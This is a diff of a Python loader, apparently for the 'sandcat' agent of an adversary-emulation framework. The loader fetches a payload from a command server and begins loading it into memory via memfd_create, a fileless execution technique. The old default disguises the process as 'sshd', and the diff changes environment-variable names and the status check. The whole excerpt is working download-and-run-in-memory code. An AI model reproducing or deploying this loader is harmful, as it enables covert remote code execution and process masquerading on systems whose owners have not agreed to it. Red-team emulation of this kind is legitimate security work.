@@ -5,16 +5,16 @@ import ctypes
 import requests
 
 # pull environment variables for server, group, and process name
-proc_name = os.getenv('SC_NAME', 'sshd')
-server = os.getenv('SC_SV', 'http://localhost:8888')
-group = os.getenv('SC_GRP', 'my_group')
+proc_name = os.getenv('SC_PROC_NAME', 'sandcat')
+server = os.getenv('SC_DEFAULTSERVER', 'http://localhost:8888')
+group = os.getenv('SC_DEFAULTGROUP', 'my_group')
 
 print("{} {} {}".format(proc_name, server, group))
 
 headers = dict(file='sandcat.go', platform='linux', defaultServer=server, defaultGroup=group)
 r = requests.get('%s/file/download' % server, headers=headers, stream=True)
-
-while r.status_code != 200:
+print(r.status_code)
+if r.status_code == 200:
     print("OK")
     obj = io.BytesIO(r.content)
     fd = ctypes.CDLL(None).syscall(319, "", 1)
